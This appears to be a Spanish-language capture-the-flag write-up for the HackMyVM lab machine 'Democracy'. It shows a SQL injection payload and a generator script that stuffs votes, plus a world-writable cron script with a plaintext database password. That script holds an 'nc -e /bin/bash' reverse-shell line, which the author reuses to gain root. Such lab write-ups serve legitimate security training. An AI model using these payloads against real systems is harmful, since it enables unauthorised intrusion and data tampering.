---
layout: post
title: Democracy - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/democracy/democracy.png#center)

## Reconocimiento

Lo primero es realizar una enumeración de los puertos abiertos.

```
$ sudo nmap -p- 192.168.1.83    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 09:13 EDT
Nmap scan report for 192.168.1.83
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:79:71:ED (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
```

### 80 (Http)

Enumero ficheros y directorios en la página web con **gobuster**.

```
$ gobuster dir -u http://192.168.1.83 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
===============================================================
[...]
/index.php            (Status: 200) [Size: 2676]
/images               (Status: 301) [Size: 313] [--> http://192.168.1.83/images/]
/.php                 (Status: 403) [Size: 277]
/login.php            (Status: 200) [Size: 2115]
/register.php         (Status: 200) [Size: 2116]
/vote.php             (Status: 302) [Size: 0] [--> login.php]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.83/javascript/]
/config.php           (Status: 200) [Size: 0]
```

Navego a "/register.php" y creo un usuario.

![img](/imgs/write-ups/hackmyvm/democracy/democracy_1.png#center)

Una vez iniciada sesión, soy redirigido a "/vote.php" donde se puede ver un formulario para realizar la votación.

Hago una votación y la capturo con **burpsuite**.

![img](/imgs/write-ups/hackmyvm/democracy/democracy_2.png#center)

Tras muchos intentos y pruebas, descubro que se puede hacer SQLinjection con el parámetro "candidate" y de esta forma añadir mas de una votación en una sola.

![img](/imgs/write-ups/hackmyvm/democracy/democracy_3.png#center)

Este es el codigo con "URL encode".

```
candidate=democrat')+union+SELECT+1,"democrat"+--+-
```

## Explotación

Para que un partido gane, es necesario llegar a los 1000 votos, por lo que creo un script que me genere la consulta completa, la cual introduciré en burpsuite.

generate_injection.py:
```python
#!/bin/python3

result = "democrat')+"

for i in range(1,1001):
   result = result + 'union+SELECT+'+str(i)+',"democrat"+'
result = result + "--+-"

print(result)
```

Ahora lo introduzco en burpsuite y rápidamente soy redirigido a "systemopening.php".

![img](/imgs/write-ups/hackmyvm/democracy/democracy_4.png#center)

Si realizo otra enumeración de puertos, se puede ver que se ha abierto un servidor FTP.

```
$ sudo nmap -p- 192.168.1.83
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 09:29 EDT
Nmap scan report for 192.168.1.83
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:79:71:ED (Oracle VirtualBox virtual NIC)
```

Al conectarme como usuario "Anonymous" encuentro un script que se ejecuta cada minuto.

```
$ ftp 192.168.1.83      
Connected to 192.168.1.83.
220 ProFTPD Server (Debian) [::ffff:192.168.1.83]
Name (192.168.1.83:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||27733|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      nogroup      4096 Apr 30 11:49 .
drwxr-xr-x   2 ftp      nogroup      4096 Apr 30 11:49 ..
-rwxrwxrwx   1 root     root          258 Apr 30 15:02 votes
226 Transfer complete
ftp>
```

votes:
```sh
#! /bin/bash

## this script runs every minute ##

#!/bin/bash

mysql -u root -pYklX69Vfa voting << EOF

SELECT COUNT(*) FROM votes WHERE candidate='republican';

SELECT COUNT(*) FROM votes WHERE candidate='democrat';

EOF

nc -e /bin/bash 192.168.0.29 4444
```

Ahora solo queda modificar la reverse shell y esperar a que se conecte.

```
$ ftp 192.168.1.83
Connected to 192.168.1.83.
220 ProFTPD Server (Debian) [::ffff:192.168.1.83]
Name (192.168.1.83:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put votes
local: votes remote: votes
229 Entering Extended Passive Mode (|||43109|)
150 Opening BINARY mode data connection for votes
100% |**********************************************************************|   258        8.20 MiB/s    00:00 ETA
226 Transfer complete
258 bytes sent in 00:00 (388.21 KiB/s)
ftp>
```

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.86] from (UNKNOWN) [192.168.1.83] 60898
script -qc /bin/bash /dev/null
root@democracy:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@democracy:~# :)
```

Sorpresa!! Root directamente.

Muchas gracias a **Cromiphi** por esta máquina.
